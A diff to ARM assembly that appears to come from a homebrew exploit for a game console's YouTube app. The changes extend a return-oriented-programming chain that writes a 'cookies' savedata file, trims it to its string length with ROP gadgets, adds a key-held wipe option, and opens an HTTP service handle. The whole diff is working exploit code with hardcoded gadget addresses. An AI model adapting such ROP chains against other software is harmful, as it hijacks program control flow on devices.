@@ -7,15 +7,7 @@
 .include "../ytb_include/ytb_include.s"
 
 PAYLOAD_LOC equ PAYLOAD_SEC_LOC
-
 PARAMBLK_LOC equ (PAYLOAD_LOC + paramblk)
-
-; TEMP
-YTB_OPENFILE equ 0x003466D8
-YTB_SETFILESIZE equ 0x00207104
-YTB_WRITEFILE equ 0x003070F4
-YTB_MOUNTSAVEARCHIVE equ 0x00205EB0
-YTB_CONTROLARCHIVE equ 0x002FF2C0
 YTB_COOKIES_FILEOBJECT equ (PAYLOAD_SEC_LOC + cookie_obj)
 
 .fill (0x1000 - .), 0xff
@@ -24,11 +16,37 @@ YTB_COOKIES_FILEOBJECT equ (PAYLOAD_SEC_LOC + cookie_obj)
 	rop:
 	set_thread_priority 0x18
 
+	; check for cookie-wiping keypress (call memclr if key is held)
+	conditional_call YTB_PAD, YTB_COOKIEWIPE_KEY, 0x0, (PAYLOAD_LOC + cookie_data), 0x40, YTB_MEMCLR
+
 	; open data:/cookies file
 	fopen YTB_COOKIES_FILEOBJECT, (PAYLOAD_LOC + cookie_filename), 0x7
 	; write cookie data
 	fwrite YTB_COOKIES_FILEOBJECT, (PAYLOAD_LOC - 0x10), (PAYLOAD_LOC + cookie_data), 0x40, 0x1
+
+	; get string length of cookie data
+	set_lr YTB_ROP_NOP
+	.word YTB_ROP_POP_R0PC
+		.word (PAYLOAD_LOC + cookie_data)
+	.word YTB_STRLEN
+	.word YTB_ROP_POP_R4PC
+		.word 0x00000001 ; add 1 for null byte
+	.word YTB_ROP_ADD_R0R0R4_POP_R4PC
+		.word 0xFFFFFFFF ; r4 (garbage)
+	.word YTB_ROP_MOV_R2R0_MOV_R0R2_POP_R4R5R6PC
+		.word 0xFFFFFFFF ; r4 (garbage)
+		.word 0xFFFFFFFF ; r5 (garbage)
+		.word 0xFFFFFFFF ; r6 (garbage)
+	.word YTB_ROP_POP_R3PC
+		.word 0x00000000 ; r3 (upper half of u64 argument)
+
+	; set file size
+	.word YTB_ROP_POP_R0PC
+		.word YTB_COOKIES_FILEOBJECT
+	.word YTB_SETFILESIZE
+
 	; commit changes to savedata
+	control_archive (PAYLOAD_LOC + archive_name)
 	control_archive (PAYLOAD_LOC + archive_name)
 
 	getServiceHandle YTB_HTTPC_HANDLE, 0x70747468, 0x0000433A, 6 ; http:C
